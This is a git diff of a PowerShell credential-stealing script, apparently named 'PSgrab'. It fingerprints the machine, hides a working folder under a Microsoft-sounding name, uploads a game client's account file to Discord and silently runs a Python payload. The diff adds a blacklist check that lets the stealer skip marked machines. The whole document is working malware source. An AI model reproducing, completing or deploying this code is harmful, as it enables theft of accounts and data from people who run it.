@@ -12,11 +12,22 @@ $gpu = (Get-WmiObject win32_VideoController).Name
 $cpu = (Get-WmiObject Win32_Processor).Name
 $hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
+$BL = "C:\Users\env:username\AppData\Local\Packages\PSgrab.BlackList\BL-Psgrab.dat.bl.prouf"
 md C:\windows\temp\Win.microsoft.Security.temp
 cls
 mkdir C:\Windows\Temp\Win.microsoft.Security.temp
 attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
 cls
+#####################################################################
+
+#####################################################################
+
+if (Test-Path $BL) {
+    exit
+}
+else {
+    
+
 #####################################################################
 
 #####################################################################
@@ -153,3 +164,6 @@ Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\Badlion Client\acco
 Start-Process -FilePath "C:\Users\$env:username\AppData\Local\Programs\Python\Python311\pythonw.exe" -ArgumentList "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py"
 #Pythonw.exe is like python.exe but with no windows (like silent start)
 ######################################################################
+}
+
+
